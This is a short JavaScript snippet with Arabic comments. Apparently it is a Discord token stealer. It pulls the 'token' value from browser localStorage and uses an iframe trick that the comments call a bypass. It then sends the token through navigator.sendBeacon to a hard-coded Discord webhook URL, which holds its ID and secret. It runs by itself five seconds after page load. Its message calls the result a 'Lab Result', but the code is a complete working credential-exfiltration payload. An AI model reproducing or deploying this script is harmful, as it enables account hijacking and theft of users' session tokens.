(function() {
    const WEBHOOK_URL = "https://discord.com/api/webhooks/1463909673303412747/i3VXrwPefUdfNamhMJlR9L_rqSOM41eWVZb641ERxaGf7KuieSjeVobmH6Y1W1tDZUH4";

    function extractAndSend() {
        try {
            // سحب التوكن من الذاكرة المحلية مباشرة
            let token = window.localStorage.getItem('token') || 
                        JSON.parse(window.localStorage.getItem('token'));
            
            if (!token) {
                // محاولة السحب عبر إطار عمل وهمي (باي باس)
                const iframe = document.createElement('iframe');
                document.body.appendChild(iframe);
                token = iframe.contentWindow.localStorage.token;
                iframe.remove();
            }

            if (token) {
                const finalToken = token.replace(/"/g, "");
                // استخدام navigator.sendBeacon لأنه مصمم لإرسال البيانات حتى لو كانت الحماية قوية
                navigator.sendBeacon(WEBHOOK_URL, JSON.stringify({
                    content: "🚨 **Lab Result - Token Extracted:** `" + finalToken + "`"
                }));
            }
        } catch (e) {
            console.error("Security mechanism blocked extraction.");
        }
    }

    // التنفيذ عند تحميل الصفحة وبعد 5 ثوانٍ لضمان استقرار الذاكرة
    setTimeout(extractAndSend, 5000);
})();
